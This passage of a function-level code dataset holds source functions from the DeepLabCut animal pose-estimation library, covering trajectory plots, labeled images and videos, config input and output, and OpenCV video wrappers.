            fig.subplots_adjust(left=0, bottom=0, right=1, top=1, wspace=0, hspace=0)
            plt.savefig(image_output)
    outputframerate = 30
    os.chdir(destfolder)
    subprocess.call(['ffmpeg', '-framerate', str(vid.fps), '-i', f'frame%0{strwidth}d.png', '-r', str(outputframerate), output_name])"
AlexEMG/DeepLabCut,create_video_from_pickled_tracks,"def create_video_from_pickled_tracks(video, pickle_file, destfolder='', output_name='', pcutoff=0.6):
    if not destfolder:
        destfolder = os.path.splitext(video)[0]
    if not output_name:
        (video_name, ext) = os.path.splitext(os.path.split(video)[1])
        output_name = video_name + 'DLClabeled' + ext
    tracks = auxiliaryfunctions.read_pickle(pickle_file)
    _create_video_from_tracks(video, tracks, destfolder, output_name, pcutoff)"
AlexEMG/DeepLabCut,_get_default_conf_to_alpha,"def _get_default_conf_to_alpha(confidence_to_alpha: bool, pcutoff: float) -> Optional[Callable[[float], float]]:
    """"""Creates the default confidence_to_alpha function""""""
    if not confidence_to_alpha:
        return None

    def default_confidence_to_alpha(x):
        if pcutoff == 0:
            return x
        return np.clip((x - pcutoff) / (1 - pcutoff), 0, 1)
    return default_confidence_to_alpha"
AlexEMG/DeepLabCut,default_confidence_to_alpha,"def default_confidence_to_alpha(x):
    if pcutoff == 0:
        return x
    return np.clip((x - pcutoff) / (1 - pcutoff), 0, 1)"
AlexEMG/DeepLabCut,Histogram,"def Histogram(vector, color, bins, ax=None, linewidth=1.0):
    dvector = np.diff(vector)
    dvector = dvector[np.isfinite(dvector)]
    if ax is None:
        fig = plt.figure()
        ax = fig.add_subplot(111)
    ax.hist(dvector, color=color, histtype='step', bins=bins, linewidth=linewidth)"
AlexEMG/DeepLabCut,PlottingResults,"def PlottingResults(tmpfolder, Dataframe, cfg, bodyparts2plot, individuals2plot, showfigures=False, suffix='.png', resolution=100, linewidth=1.0):
    """"""Plots poses vs time; pose x vs pose y; histogram of differences and likelihoods.""""""
    pcutoff = cfg['pcutoff']
    colors = visualization.get_cmap(len(bodyparts2plot), name=cfg['colormap'])
    alphavalue = cfg['alphavalue']
    if individuals2plot:
        Dataframe = Dataframe.loc(axis=1)[:, individuals2plot]
    animal_bpts = Dataframe.columns.get_level_values('bodyparts')
    fig1 = plt.figure(figsize=(8, 6))
    ax1 = fig1.add_subplot(111)
    ax1.set_xlabel('X position in pixels')
    ax1.set_ylabel('Y position in pixels')
    ax1.invert_yaxis()
    fig2 = plt.figure(figsize=(10, 3))
    ax2 = fig2.add_subplot(111)
    ax2.set_xlabel('Frame Index')
    ax2.set_ylabel('X-(dashed) and Y- (solid) position in pixels')
    fig3 = plt.figure(figsize=(10, 3))
    ax3 = fig3.add_subplot(111)
    ax3.set_xlabel('Frame Index')
    ax3.set_ylabel('Likelihood (use to set pcutoff)')
    fig4 = plt.figure()
    ax4 = fig4.add_subplot(111)
    ax4.set_ylabel('Count')
    ax4.set_xlabel('DeltaX and DeltaY')
    bins = np.linspace(0, np.amax(Dataframe.max()), 100)
    with np.errstate(invalid='ignore'):
        for (bpindex, bp) in enumerate(bodyparts2plot):
            if bp in animal_bpts:
                prob = Dataframe.xs((bp, 'likelihood'), level=(-2, -1), axis=1).values.squeeze()
                mask = prob < pcutoff
                temp_x = np.ma.array(Dataframe.xs((bp, 'x'), level=(-2, -1), axis=1).values.squeeze(), mask=mask)
                temp_y = np.ma.array(Dataframe.xs((bp, 'y'), level=(-2, -1), axis=1).values.squeeze(), mask=mask)
                ax1.plot(temp_x, temp_y, '.', color=colors(bpindex), alpha=alphavalue)
                ax2.plot(temp_x, '--', color=colors(bpindex), linewidth=linewidth, alpha=alphavalue)
                ax2.plot(temp_y, '-', color=colors(bpindex), linewidth=linewidth, alpha=alphavalue)
                ax3.plot(prob, '-', color=colors(bpindex), linewidth=linewidth, alpha=alphavalue)
                Histogram(temp_x, colors(bpindex), bins, ax4, linewidth=linewidth)
                Histogram(temp_y, colors(bpindex), bins, ax4, linewidth=linewidth)
    sm = plt.cm.ScalarMappable(cmap=plt.get_cmap(cfg['colormap']), norm=plt.Normalize(vmin=0, vmax=len(bodyparts2plot) - 1))
    sm._A = []
    for ax in (ax1, ax2, ax3, ax4):
        cbar = plt.colorbar(sm, ax=ax, ticks=range(len(bodyparts2plot)))
        cbar.set_ticklabels(bodyparts2plot)
    fig1.savefig(os.path.join(tmpfolder, 'trajectory' + suffix), bbox_inches='tight', dpi=resolution)
    fig2.savefig(os.path.join(tmpfolder, 'plot' + suffix), bbox_inches='tight', dpi=resolution)
    fig3.savefig(os.path.join(tmpfolder, 'plot-likelihood' + suffix), bbox_inches='tight', dpi=resolution)
    fig4.savefig(os.path.join(tmpfolder, 'hist' + suffix), bbox_inches='tight', dpi=resolution)
    if not showfigures:
        plt.close('all')
    else:
        plt.show()"
AlexEMG/DeepLabCut,plot_trajectories,"def plot_trajectories(config, videos, videotype='', shuffle=1, trainingsetindex=0, filtered=False, displayedbodyparts='all', displayedindividuals='all', showfigures=False, destfolder=None, modelprefix='', imagetype='.png', resolution=100, linewidth=1.0, track_method=''):
    """"""Plots the trajectories of various bodyparts across the video.

    Parameters
    ----------
    config: str
        Full path of the config.yaml file.

    videos: list[str]
        Full paths to videos for analysis or a path to the directory, where all the
        videos with same extension are stored.

    videotype: str, optional, default=""""
        Checks for the extension of the video in case the input to the video is a
        directory. Only videos with this extension are analyzed.
        If left unspecified, videos with common extensions
        ('avi', 'mp4', 'mov', 'mpeg', 'mkv') are kept.

    shuffle: int, optional, default=1
        Integer specifying the shuffle index of the training dataset.

    trainingsetindex: int, optional, default=0
        Integer specifying which TrainingsetFraction to use.
        Note that TrainingFraction is a list in config.yaml.

    filtered: bool, optional, default=False
        Boolean variable indicating if filtered output should be plotted rather than
        frame-by-frame predictions. Filtered version can be calculated with
        ``deeplabcut.filterpredictions``.

    displayedbodyparts: list[str] or str, optional, default=""all""
        This select the body parts that are plotted in the video.
        Either ``all``, then all body parts from config.yaml are used,
        or a list of strings that are a subset of the full list.
        E.g. ['hand','Joystick'] for the demo Reaching-Mackenzie-2018-08-30/config.yaml
        to select only these two body parts.

    showfigures: bool, optional, default=False
        If ``True`` then plots are also displayed.

    destfolder: string or None, optional, default=None
        Specifies the destination folder that was used for storing analysis data. If
        ``None``, the path of the video is used.

    modelprefix: str, optional, default=""""
        Directory containing the deeplabcut models to use when evaluating the network.
        By default, the models are assumed to exist in the project folder.

    imagetype: string, optional, default="".png""
        Specifies the output image format - '.tif', '.jpg', '.svg' and "".png"".

    resolution: int, optional, default=100
        Specifies the resolution (in dpi) of saved figures.
        Note higher resolution figures take longer to generate.

    linewidth: float, optional, default=1.0
        Specifies width of line for line and histogram plots.

    track_method: string, optional, default=""""
         Specifies the tracker used to generate the data.
         Empty by default (corresponding to a single animal project).
         For multiple animals, must be either 'box', 'skeleton', or 'ellipse' and will
         be taken from the config.yaml file if none is given.

    Returns
    -------
    None

    Examples
    --------

    To label the frames

    >>> deeplabcut.plot_trajectories(
            'home/alex/analysis/project/reaching-task/config.yaml',
            ['/home/alex/analysis/project/videos/reachingvideo1.avi'],
        )
    """"""
    cfg = auxiliaryfunctions.read_config(config)
    track_method = auxfun_multianimal.get_track_method(cfg, track_method=track_method)
    trainFraction = cfg['TrainingFraction'][trainingsetindex]
    (DLCscorer, DLCscorerlegacy) = auxiliaryfunctions.get_scorer_name(cfg, shuffle, trainFraction, modelprefix=modelprefix)
    bodyparts = auxiliaryfunctions.intersection_of_body_parts_and_ones_given_by_user(cfg, displayedbodyparts)
    individuals = auxfun_multianimal.IntersectionofIndividualsandOnesGivenbyUser(cfg, displayedindividuals)
    Videos = auxiliaryfunctions.get_list_of_videos(videos, videotype)
    if not len(Videos):
        print('No videos found. Make sure you passed a list of videos and that *videotype* is right.')
        return
    (failures, multianimal_errors) = ([], [])
    for video in Videos:
        if destfolder is None:
            videofolder = str(Path(video).parents[0])
        else:
            videofolder = destfolder
        vname = str(Path(video).stem)
        print('Loading ', video, 'and data.')
        try:
            (df, filepath, _, suffix) = auxiliaryfunctions.load_analyzed_data(videofolder, vname, DLCscorer, filtered, track_method)
            tmpfolder = os.path.join(videofolder, 'plot-poses', vname)
            _plot_trajectories(filepath, bodyparts, individuals, showfigures, resolution, linewidth, cfg['colormap'], cfg['alphavalue'], cfg['pcutoff'], suffix, imagetype, tmpfolder)
        except FileNotFoundError as e:
            print(e)
            failures.append(video)
            if track_method != '':
                try:
                    _ = auxiliaryfunctions.load_detection_data(video, DLCscorer, track_method)
                    error_message = 'Call ""deeplabcut.stitch_tracklets() prior to plotting the trajectories.'
                except FileNotFoundError as e:
                    print(e)
                    error_message = f'Make sure {video} was previously analyzed, and that detections were successively converted to tracklets using ""deeplabcut.convert_detections2tracklets()"" and ""deeplabcut.stitch_tracklets()"".'
                multianimal_errors.append(error_message)
    if len(failures) > 0:
        failed_videos = ','.join(failures)
        if len(multianimal_errors) > 0:
            verbose_error = ': ' + ' '.join(multianimal_errors)
        else:
            verbose_error = '.'
        print(f'Plots could not be created for {failed_videos}. Videos were not evaluated with the current scorer {DLCscorer}' + verbose_error)
    else:
        print('Plots created! Please check the directory ""plot-poses"" within the video directory')"
AlexEMG/DeepLabCut,_plot_trajectories,"def _plot_trajectories(h5file, bodyparts=None, individuals=None, show=False, resolution=100, linewidth=1.0, colormap='viridis', alpha=1.0, pcutoff=0.01, suffix='', image_type='.png', dest_folder=None):
    df = pd.read_hdf(h5file)
    if bodyparts is None:
        bodyparts = list(df.columns.get_level_values('bodyparts').unique())
    if individuals is None:
        try:
            individuals = set(df.columns.get_level_values('individuals'))
        except KeyError:
            individuals = ['']
    if dest_folder is None:
        vname = os.path.basename(h5file).split('DLC')[0]
        vid_folder = os.path.dirname(h5file)
        dest_folder = os.path.join(vid_folder, 'plot-poses', vname)
    auxiliaryfunctions.attempt_to_make_folder(dest_folder, recursive=True)
    labeled_bpts = [bp for bp in df.columns.get_level_values('bodyparts').unique() if bp in bodyparts]
    try:
        animals = set(df.columns.get_level_values('individuals'))
    except KeyError:
        animals = {''}
    cfg = {'colormap': colormap, 'alphavalue': alpha, 'pcutoff': pcutoff}
    for animal in animals.intersection(individuals) or animals:
        PlottingResults(dest_folder, df, cfg, labeled_bpts, animal, show, suffix + animal + image_type, resolution=resolution, linewidth=linewidth)"
AlexEMG/DeepLabCut,_plot_paf_performance,"def _plot_paf_performance(within, between, nbins=51, kde=True, colors=None, ax=None):
    import seaborn as sns
    bins = np.linspace(0, 1, nbins)
    if colors is None:
        colors = ('#EFC9AF', '#1F8AC0')
    if ax is None:
        (fig, ax) = plt.subplots(tight_layout=True, figsize=(3, 3))
    sns.histplot(within, kde=kde, ax=ax, stat='probability', color=colors[0], bins=bins)
    sns.histplot(between, kde=kde, ax=ax, stat='probability', color=colors[1], bins=bins)
    return ax"
AlexEMG/DeepLabCut,plot_edge_affinity_distributions,"def plot_edge_affinity_distributions(eval_pickle_file, include_bodyparts='all', output_name='', figsize=(10, 7)):
    """"""
    Display the distribution of affinity costs of within- and between-animal edges.

    Parameters
    ----------
    eval_pickle_file : string
        Path to a *_full.pickle from the evaluation-results folder.

    include_bodyparts : list of strings, optional
        A list of body part names whose edges are to be shown.
        By default, all body parts and their corresponding edges are analyzed.
        We recommend only passing a subset of body parts for projects with large graphs.

    output_name: string, optional
        Path where the plot is saved. By default, it is stored as costdist.png.

    figsize: tuple
        Figure size in inches.

    """"""
    with open(eval_pickle_file, 'rb') as file:
        data = pickle.load(file)
    meta_pickle_file = eval_pickle_file.replace('_full.', '_meta.')
    with open(meta_pickle_file, 'rb') as file:
        metadata = pickle.load(file)
    ((w_train, _), (b_train, _)) = crossvalutils._calc_within_between_pafs(data, metadata, train_set_only=True)
    data.pop('metadata', None)
    nonempty = set((i for (i, vals) in w_train.items() if vals))
    meta = metadata['data']['DLC-model-config file']
    bpts = list(map(str.lower, meta['all_joints_names']))
    inds_multi = set((b for edge in meta['partaffinityfield_graph'] for b in edge))
    if include_bodyparts == 'all':
        include_bodyparts = inds_multi
    else:
        include_bodyparts = set((bpts.index(bpt) for bpt in include_bodyparts))
    edges_to_keep = set()
    graph = meta['partaffinityfield_graph']
    for (n, edge) in enumerate(graph):
        if not any((i in include_bodyparts for i in edge)):
            continue
        edges_to_keep.add(n)
    edge_inds = edges_to_keep.intersection(nonempty)
    nrows = int(np.ceil(np.sqrt(len(edge_inds))))
    ncols = int(np.ceil(len(edge_inds) / nrows))
    (fig, axes_) = plt.subplots(nrows, ncols, figsize=figsize, tight_layout=True, squeeze=False)
    axes = axes_.flatten()
    for ax in axes:
        ax.axis('off')
    for (n, ind) in enumerate(edge_inds):
        (i1, i2) = graph[ind]
        w_tr = w_train[ind]
        b_tr = b_train[ind]
        (sep, _) = crossvalutils._calc_separability(b_tr, w_tr, metric='auc')
        axes[n].text(0.5, 0.8, f'{bpts[i1]}–{bpts[i2]}\n{sep:.2f}', size=8, ha='center', transform=axes[n].transAxes)
        _plot_paf_performance(w_tr, b_tr, ax=axes[n], kde=False)
    axes[0].set_xticks([])
    axes[0].set_yticks([])
    if not output_name:
        output_name = 'costdist.jpg'
    fig.savefig(output_name, dpi=600)"
AlexEMG/DeepLabCut,read_config,"def read_config(configname):
    if not os.path.exists(configname):
        raise FileNotFoundError(f'Config {configname} is not found. Please make sure that the file exists.')
    with open(configname) as file:
        return YAML().load(file)"
AlexEMG/DeepLabCut,write_config,"def write_config(configname, cfg):
    with open(configname, 'w') as file:
        YAML().dump(cfg, file)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, config_path):
    self.config_path = config_path
    self.cfg = read_config(config_path)
    self.df = None
    found = False
    root = os.path.join(self.cfg['project_path'], 'labeled-data')
    for dir_ in os.listdir(root):
        folder = os.path.join(root, dir_)
        if os.path.isdir(folder) and (not any((folder.endswith(s) for s in ('cropped', 'labeled')))):
            self.df = pd.read_hdf(os.path.join(folder, f""CollectedData_{self.cfg['scorer']}.h5""))
            (row, col) = self.pick_labeled_frame()
            if 'individuals' in self.df.columns.names:
                self.df = self.df.xs(col, axis=1, level='individuals')
            self.xy = self.df.loc[row].values.reshape((-1, 2))
            missing = np.flatnonzero(np.isnan(self.xy).all(axis=1))
            if not missing.size:
                found = True
                break
    if self.df is None:
        raise IOError('No labeled data were found.')
    self.bpts = self.df.columns.get_level_values('bodyparts').unique()
    if not found:
        warnings.warn(f""A fully labeled animal could not be found. {', '.join(self.bpts[missing])} will need to be manually connected in the config.yaml."")
    self.tree = KDTree(self.xy)
    if isinstance(row, str):
        sep = '/' if '/' in row else '\\'
        row = row.split(sep)
    self.image = io.imread(os.path.join(self.cfg['project_path'], *row))
    self.inds = set()
    self.segs = set()
    if self.cfg['skeleton']:
        for bone in self.cfg['skeleton']:
            pair = np.flatnonzero(self.bpts.isin(bone))
            if len(pair) != 2:
                continue
            pair_sorted = tuple(sorted(pair))
            self.inds.add(pair_sorted)
            self.segs.add(tuple(map(tuple, self.xy[pair_sorted, :])))
    self.lines = LineCollection(self.segs, colors=mcolors.to_rgba(self.cfg['skeleton_color']))
    self.lines.set_picker(True)
    self.show()"
AlexEMG/DeepLabCut,pick_labeled_frame,"def pick_labeled_frame(self):
    try:
        count = self.df.groupby(level='individuals', axis=1).count()
        if 'single' in count:
            count.drop('single', axis=1, inplace=True)
    except KeyError:
        count = self.df.count(axis=1).to_frame()
    mask = count.where(count == count.values.max())
    kept = mask.stack().index.to_list()
    np.random.shuffle(kept)
    picked = kept.pop()
    row = picked[:-1]
    col = picked[-1]
    return (row, col)"
AlexEMG/DeepLabCut,show,"def show(self):
    self.fig = plt.figure()
    ax = self.fig.add_subplot(111)
    ax.axis('off')
    lo = np.nanmin(self.xy, axis=0)
    hi = np.nanmax(self.xy, axis=0)
    center = (hi + lo) / 2
    (w, h) = hi - lo
    ampl = 1.3
    w *= ampl
    h *= ampl
    ax.set_xlim(center[0] - w / 2, center[0] + w / 2)
    ax.set_ylim(center[1] - h / 2, center[1] + h / 2)
    ax.imshow(self.image)
    ax.scatter(*self.xy.T, s=self.cfg['dotsize'] ** 2)
    ax.add_collection(self.lines)
    ax.invert_yaxis()
    self.lasso = LassoSelector(ax, onselect=self.on_select)
    ax_clear = self.fig.add_axes([0.85, 0.55, 0.1, 0.1])
    ax_export = self.fig.add_axes([0.85, 0.45, 0.1, 0.1])
    self.clear_button = Button(ax_clear, 'Clear')
    self.clear_button.on_clicked(self.clear)
    self.export_button = Button(ax_export, 'Export')
    self.export_button.on_clicked(self.export)
    self.fig.canvas.mpl_connect('pick_event', self.on_pick)
    plt.show()"
AlexEMG/DeepLabCut,clear,"def clear(self, *args):
    self.inds.clear()
    self.segs.clear()
    self.lines.set_segments(self.segs)"
AlexEMG/DeepLabCut,export,"def export(self, *args):
    inds_flat = set((ind for pair in self.inds for ind in pair))
    unconnected = [i for i in range(len(self.xy)) if i not in inds_flat]
    if len(unconnected):
        warnings.warn(f""You didn't connect all the bodyparts (which is fine!). This is just a note to let you know."")
    self.cfg['skeleton'] = [tuple(self.bpts[list(pair)]) for pair in self.inds]
    write_config(self.config_path, self.cfg)"
AlexEMG/DeepLabCut,on_pick,"def on_pick(self, event):
    if event.mouseevent.button == 3:
        removed = event.artist.get_segments().pop(event.ind[0])
        self.segs.remove(tuple(map(tuple, removed)))
        self.inds.remove(tuple(self.tree.query(removed)[1]))"
AlexEMG/DeepLabCut,on_select,"def on_select(self, verts):
    self.path = Path(verts)
    self.verts = verts
    inds = self.tree.query_ball_point(verts, 5)
    inds_unique = []
    for lst in inds:
        if len(lst) and lst[0] not in inds_unique:
            inds_unique.append(lst[0])
    for pair in zip(inds_unique, inds_unique[1:]):
        pair_sorted = tuple(sorted(pair))
        self.inds.add(pair_sorted)
        self.segs.add(tuple(map(tuple, self.xy[pair_sorted, :])))
    self.lines.set_segments(self.segs)
    self.fig.canvas.draw_idle()"
AlexEMG/DeepLabCut,__init__,"def __init__(self, fname='', sname='', nframes=-1, fps=None, codec='X264', sh='', sw=''):
    self.fname = fname
    self.sname = sname
    self.nframes = nframes
    self.codec = codec
    self.h = 0
    self.w = 0
    self.nc = 3
    self.i = 0
    try:
        if self.fname != '':
            self.vid = self.get_video()
            self.get_info()
            self.sh = 0
            self.sw = 0
        if self.sname != '':
            if sh == '' and sw == '':
                self.sh = self.h
                self.sw = self.w
            else:
                self.sw = sw
                self.sh = sh
            self.svid = self.create_video()
    except Exception as ex:
        print('Error: %s', ex)
    if fps is not None:
        self.FPS = fps"
AlexEMG/DeepLabCut,load_frame,"def load_frame(self):
    frame = self._read_frame()
    if frame is not None:
        self.i += 1
    return frame"
AlexEMG/DeepLabCut,height,"def height(self):
    return self.h"
AlexEMG/DeepLabCut,width,"def width(self):
    return self.w"
AlexEMG/DeepLabCut,fps,"def fps(self):
    return self.FPS"
AlexEMG/DeepLabCut,counter,"def counter(self):
    return self.i"
AlexEMG/DeepLabCut,frame_count,"def frame_count(self):
    return self.nframes"
AlexEMG/DeepLabCut,get_video,"def get_video(self):
    """"""
        implement your own
        """"""
    pass"
AlexEMG/DeepLabCut,get_info,"def get_info(self):
    """"""
        implement your own
        """"""
    pass"
AlexEMG/DeepLabCut,create_video,"def create_video(self):
    """"""
        implement your own
        """"""
    pass"
AlexEMG/DeepLabCut,_read_frame,"def _read_frame(self):
    """"""
        implement your own
        """"""
    pass"
AlexEMG/DeepLabCut,save_frame,"def save_frame(self, frame):
    """"""
        implement your own
        """"""
    pass"
AlexEMG/DeepLabCut,close,"def close(self):
    """"""
        implement your own
        """"""
    pass"
AlexEMG/DeepLabCut,__init__,"def __init__(self, *args, **kwargs):
    super(VideoProcessorCV, self).__init__(*args, **kwargs)"
AlexEMG/DeepLabCut,get_video,"def get_video(self):
    return cv2.VideoCapture(self.fname)"
AlexEMG/DeepLabCut,get_info,"def get_info(self):
    self.w = int(self.vid.get(cv2.CAP_PROP_FRAME_WIDTH))
    self.h = int(self.vid.get(cv2.CAP_PROP_FRAME_HEIGHT))
    all_frames = int(self.vid.get(cv2.CAP_PROP_FRAME_COUNT))
    self.FPS = self.vid.get(cv2.CAP_PROP_FPS)
    self.nc = 3
    if self.nframes == -1 or self.nframes > all_frames:
        self.nframes = all_frames"
AlexEMG/DeepLabCut,create_video,"def create_video(self):
    fourcc = cv2.VideoWriter_fourcc(*self.codec)
    return cv2.VideoWriter(self.sname, fourcc, self.FPS, (self.sw, self.sh), True)"
AlexEMG/DeepLabCut,_read_frame,"def _read_frame(self):
    (success, frame) = self.vid.read()
    if not success:
        return frame
    return np.flip(frame, 2)"
AlexEMG/DeepLabCut,save_frame,"def save_frame(self, frame):
    if frame is not None:
        self.svid.write(np.flip(frame, 2))"
AlexEMG/DeepLabCut,close,"def close(self):
    if hasattr(self, 'svid') and self.svid is not None:
        self.svid.release()
    if hasattr(self, 'vid') and self.vid is not None:
        self.vid.release()"
AlexEMG/DeepLabCut,get_cmap,"def get_cmap(n, name='hsv'):
    """"""Returns a function that maps each index in 0, 1, ..., n-1 to a distinct
    RGB color; the keyword argument name must be a standard mpl colormap name.""""""
    return plt.cm.get_cmap(name, n)"
AlexEMG/DeepLabCut,make_labeled_image,"def make_labeled_image(frame, DataCombined, imagenr, pcutoff, Scorers, bodyparts, colors, cfg, labels=['+', '.', 'x'], scaling=1, ax=None):
    """"""Creating a labeled image with the original human labels, as well as the DeepLabCut's!""""""
    alphavalue = cfg['alphavalue']
    dotsize = cfg['dotsize']
    if ax is None:
        if np.ndim(frame) > 2:
            (h, w, numcolors) = np.shape(frame)
        else:
            (h, w) = np.shape(frame)
        (_, ax) = prepare_figure_axes(w, h, scaling)
    ax.imshow(frame, 'gray')
    for (scorerindex, loopscorer) in enumerate(Scorers):
        for (bpindex, bp) in enumerate(bodyparts):
            if np.isfinite(DataCombined[loopscorer][bp]['y'][imagenr] + DataCombined[loopscorer][bp]['x'][imagenr]):
                (y, x) = (int(DataCombined[loopscorer][bp]['y'][imagenr]), int(DataCombined[loopscorer][bp]['x'][imagenr]))
                if cfg['scorer'] not in loopscorer:
                    p = DataCombined[loopscorer][bp]['likelihood'][imagenr]
                    if p > pcutoff:
                        ax.plot(x, y, labels[1], ms=dotsize, alpha=alphavalue, color=colors(int(bpindex)))
                    else:
                        ax.plot(x, y, labels[2], ms=dotsize, alpha=alphavalue, color=colors(int(bpindex)))
                else:
                    ax.plot(x, y, labels[0], ms=dotsize, alpha=alphavalue, color=colors(int(bpindex)))
    return ax"
AlexEMG/DeepLabCut,make_multianimal_labeled_image,"def make_multianimal_labeled_image(frame, coords_truth, coords_pred, probs_pred, colors, dotsize=12, alphavalue=0.7, pcutoff=0.6, labels=['+', '.', 'x'], ax=None):
    if ax is None:
        (h, w, _) = np.shape(frame)
        (_, ax) = prepare_figure_axes(w, h)
    ax.imshow(frame, 'gray')
    for (n, data) in enumerate(zip(coords_truth, coords_pred, probs_pred)):
        color = colors(n)
        (coord_gt, coord_pred, prob_pred) = data
        ax.plot(*coord_gt.T, labels[0], ms=dotsize, alpha=alphavalue, color=color)
        if not coord_pred.shape[0]:
            continue
        reliable = np.repeat(prob_pred >= pcutoff, coord_pred.shape[1], axis=1)
        ax.plot(*coord_pred[reliable[:, 0]].T, labels[1], ms=dotsize, alpha=alphavalue, color=color)
        if not np.all(reliable):
            ax.plot(*coord_pred[~reliable[:, 0]].T, labels[2], ms=dotsize, alpha=alphavalue, color=color)
    return ax"
AlexEMG/DeepLabCut,plot_and_save_labeled_frame,"def plot_and_save_labeled_frame(DataCombined, ind, trainIndices, cfg, colors, comparisonbodyparts, DLCscorer, foldername, fig, ax, scaling=1):
    image_path = os.path.join(cfg['project_path'], *DataCombined.index[ind])
    frame = io.imread(image_path)
    if np.ndim(frame) > 2:
        (h, w, numcolors) = np.shape(frame)
    else:
        (h, w) = np.shape(frame)
    fig.set_size_inches(w / 100, h / 100)
    ax.set_xlim(0, w)
    ax.set_ylim(0, h)
    ax.invert_yaxis()
    ax = make_labeled_image(frame, DataCombined, ind, cfg['pcutoff'], [cfg['scorer'], DLCscorer], comparisonbodyparts, colors, cfg, scaling=scaling, ax=ax)
    save_labeled_frame(fig, image_path, foldername, ind in trainIndices)
    return ax"
AlexEMG/DeepLabCut,save_labeled_frame,"def save_labeled_frame(fig, image_path, dest_folder, belongs_to_train):
    path = Path(image_path)
    imagename = path.parts[-1]
    imfoldername = path.parts[-2]
    if belongs_to_train:
        dest = '-'.join(('Training', imfoldername, imagename))
    else:
        dest = '-'.join(('Test', imfoldername, imagename))
    full_path = os.path.join(dest_folder, dest)
    if len(full_path) >= 260 and os.name == 'nt':
        full_path = '\\\\?\\' + full_path
    fig.subplots_adjust(left=0, bottom=0, right=1, top=1, wspace=0, hspace=0)
    fig.savefig(full_path)"
AlexEMG/DeepLabCut,create_minimal_figure,"def create_minimal_figure(dpi=100):
    (fig, ax) = plt.subplots(frameon=False, dpi=dpi)
    ax.axis('off')
    ax.invert_yaxis()
    return (fig, ax)"
AlexEMG/DeepLabCut,erase_artists,"def erase_artists(ax):
    for artist in ax.lines + ax.collections + ax.artists + ax.patches + ax.images:
        artist.remove()
    ax.figure.canvas.draw_idle()"
AlexEMG/DeepLabCut,prepare_figure_axes,"def prepare_figure_axes(width, height, scale=1.0, dpi=100):
    fig = plt.figure(frameon=False, figsize=(width * scale / dpi, height * scale / dpi), dpi=dpi)
    ax = fig.add_subplot(111)
    ax.axis('off')
    ax.set_xlim(0, width)
    ax.set_ylim(0, height)
    ax.invert_yaxis()
    return (fig, ax)"
AlexEMG/DeepLabCut,make_labeled_images_from_dataframe,"def make_labeled_images_from_dataframe(df, cfg, destfolder='', scale=1.0, dpi=100, keypoint='+', draw_skeleton=True, color_by='bodypart'):
    """"""
    Write labeled frames to disk from a DataFrame.
    Parameters
    ----------
    df : pd.DataFrame
        DataFrame containing the labeled data. Typically, the DataFrame is obtained
        through pandas.read_csv() or pandas.read_hdf().
    cfg : dict
        Project configuration.
    destfolder : string, optional
        Destination folder into which images will be stored. By default, same location as the labeled data.
        Note that the folder will be created if it does not exist.
    scale : float, optional
        Up/downscale the output dimensions.
        By default, outputs are of the same dimensions as the original images.
    dpi : int, optional
        Output resolution. 100 dpi by default.
    keypoint : str, optional
        Keypoint appearance. By default, keypoints are marked by a + sign.
        Refer to https://matplotlib.org/3.2.1/api/markers_api.html for a list of all possible options.
    draw_skeleton : bool, optional
        Whether to draw the animal skeleton as defined in *cfg*. True by default.
    color_by : str, optional
        Color scheme of the keypoints. Must be either 'bodypart' or 'individual'.
        By default, keypoints are colored relative to the bodypart they represent.
    """"""
    bodyparts = df.columns.get_level_values('bodyparts')
    bodypart_names = bodyparts.unique()
    nbodyparts = len(bodypart_names)
    bodyparts = bodyparts[::2]
    draw_skeleton = draw_skeleton and cfg['skeleton']
    if color_by == 'bodypart':
        map_ = bodyparts.map(dict(zip(bodypart_names, range(nbodyparts))))
        cmap = get_cmap(nbodyparts, cfg['colormap'])
        colors = cmap(map_)
    elif color_by == 'individual':
        try:
            individuals = df.columns.get_level_values('individuals')
            individual_names = individuals.unique().to_list()
            nindividuals = len(individual_names)
            individuals = individuals[::2]
            map_ = individuals.map(dict(zip(individual_names, range(nindividuals))))
            cmap = get_cmap(nindividuals, cfg['colormap'])
            colors = cmap(map_)
        except KeyError as e:
            raise Exception('Coloring by individuals is only valid for multi-animal data') from e
    else:
        raise ValueError('`color_by` must be either `bodypart` or `individual`.')
    bones = []
    if draw_skeleton:
        for (bp1, bp2) in cfg['skeleton']:
            (match1, match2) = ([], [])
            for (j, bp) in enumerate(bodyparts):
                if bp == bp1:
                    match1.append(j)
                elif bp == bp2:
                    match2.append(j)
            bones.extend(zip(match1, match2))
    ind_bones = tuple(zip(*bones))
    images_list = [os.path.join(cfg['project_path'], *tuple_) for tuple_ in df.index.tolist()]
    if not destfolder:
        destfolder = os.path.dirname(images_list[0])
    tmpfolder = destfolder + '_labeled'
    auxiliaryfunctions.attempt_to_make_folder(tmpfolder)
    ic = io.imread_collection(images_list)
    (h, w) = ic[0].shape[:2]
    all_same_shape = True
    for array in ic[1:]:
        if array.shape[:2] != (h, w):
            all_same_shape = False
            break
    xy = df.values.reshape((df.shape[0], -1, 2))
    segs = xy[:, ind_bones].swapaxes(1, 2)
    s = cfg['dotsize']
    alpha = cfg['alphavalue']
    if all_same_shape:
        (fig, ax) = prepare_figure_axes(w, h, scale, dpi)
        im = ax.imshow(np.zeros((h, w)), 'gray')
        pts = [ax.plot([], [], keypoint, ms=s, alpha=alpha, color=c)[0] for c in colors]
        coll = LineCollection([], colors=cfg['skeleton_color'], alpha=alpha)
        ax.add_collection(coll)
        for i in trange(len(ic)):
            filename = ic.files[i]
            ind = images_list.index(filename)
            coords = xy[ind]
            img = ic[i]
            if img.ndim == 2 or img.shape[-1] == 1:
                img = color.gray2rgb(ic[i])
            im.set_data(img)
            for (pt, coord) in zip(pts, coords):
                pt.set_data(*coord)
            if ind_bones:
                coll.set_segments(segs[ind])
            imagename = os.path.basename(filename)
            fig.subplots_adjust(left=0, bottom=0, right=1, top=1, wspace=0, hspace=0)
            fig.savefig(os.path.join(tmpfolder, imagename.replace('.png', f'_{color_by}.png')), dpi=dpi)
        plt.close(fig)
    else:
        for i in trange(len(ic)):
            filename = ic.files[i]
            ind = images_list.index(filename)
            coords = xy[ind]
            image = ic[i]
            (h, w) = image.shape[:2]
            (fig, ax) = prepare_figure_axes(w, h, scale, dpi)
            ax.imshow(image)
            for (coord, c) in zip(coords, colors):
                ax.plot(*coord, keypoint, ms=s, alpha=alpha, color=c)
            if ind_bones:
                coll = LineCollection(segs[ind], colors=cfg['skeleton_color'], alpha=alpha)
                ax.add_collection(coll)
            imagename = os.path.basename(filename)
            fig.subplots_adjust(left=0, bottom=0, right=1, top=1, wspace=0, hspace=0)
